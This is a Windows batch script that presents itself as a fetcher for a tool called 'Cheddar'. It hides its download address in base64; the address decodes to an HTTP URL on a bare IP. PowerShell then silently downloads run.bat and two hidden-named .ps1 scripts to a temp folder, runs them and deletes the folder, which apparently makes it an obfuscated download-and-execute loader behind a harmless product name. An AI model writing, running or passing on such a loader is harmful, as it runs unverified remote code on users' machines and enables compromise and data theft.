@echo off
setlocal

set "SRC=aHR0cDovLzEwOS4xMjMuMjM0LjY5L2NoZWRkYXItY2xp"
set "DEST=%TEMP%\cheddar-fetch-%RANDOM%"

mkdir "%DEST%" >nul 2>&1

echo Buying Cheddar...
powershell -NoProfile -Command "$ProgressPreference='SilentlyContinue'; $u=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%SRC%')); try { Invoke-WebRequest ($u+'/run.bat') -OutFile '%DEST%\run.bat' -UseBasicParsing; Invoke-WebRequest ($u+'/.cheddar.ps1') -OutFile '%DEST%\.cheddar.ps1' -UseBasicParsing; Invoke-WebRequest ($u+'/.install.ps1') -OutFile '%DEST%\.install.ps1' -UseBasicParsing } catch { Write-Host $_.Exception.Message -ForegroundColor Red; exit 1 }"

if errorlevel 1 (
    echo Cheddar store is closed -- check your connection and try again.
    rmdir /s /q "%DEST%" >nul 2>&1
    pause
    exit /b 1
)

call "%DEST%\run.bat"

if errorlevel 1 (
    echo Grinding cheddar failed.
    rmdir /s /q "%DEST%" >nul 2>&1
    pause
    exit /b 1
)

rmdir /s /q "%DEST%" >nul 2>&1
endlocal
